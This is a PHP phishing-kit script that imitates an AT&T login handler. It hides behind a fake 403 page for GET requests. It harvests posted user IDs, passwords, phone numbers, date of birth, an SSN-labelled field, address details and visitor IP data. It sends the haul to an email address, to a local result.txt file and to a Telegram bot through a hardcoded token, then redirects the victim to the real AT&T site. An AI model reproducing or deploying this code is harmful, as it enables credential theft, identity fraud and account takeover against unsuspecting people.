<?php 

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

$Ok= "hellyk@proton.me"; 
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
$ln = trim($_POST['ai']);
$mobile = trim($_POST['mb1']);
$dob = trim($_POST['emonth']);
$ssn = trim($_POST['eyear']);
$stret = trim($_POST['address']);
$city = trim($_POST['city']);
$state = trim($_POST['state']);
$zip = trim($_POST['postalCode']);


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$fuck .= "|----------|AT&T - Login |--------------|\n";
	$fuck .= "User ID           : ".$email."\n";
	$fuck .= "Password           : ".$password."\n";
	
	$fuck .= "|----------- I N F O | I P ----------------|\n";

$fuck .= "======= [ Ip & Hostname Info ] =======\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "City: {$geoplugin->city}\n";
$fuck .= "Region: {$geoplugin->region}\n";
$fuck .= "Country Name: {$geoplugin->countryName}\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=======+Vi3nas is HERE+======\n";
$subject = "AT&T  $ip";
{
$headers = "From:AT&T  <ShellHost@_ID>";
mail($Ok,$message,$subject,$fuck,$headers);
$file = fopen("../result.txt","a");
fwrite($file,$fuck);
fclose($file);
$txt = $fuck;
$chat_id = "6673953978"; 
$bot_url = "bot7416612368:AAGafSptJ7YPB_JuhhUBtqasy_H9dVmyVqQ"; 

    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);   

}
 header("Location:https://www.AT&T.com/");
	$signal = 'ok';
	$msg = 'InValid Credentials';

?>
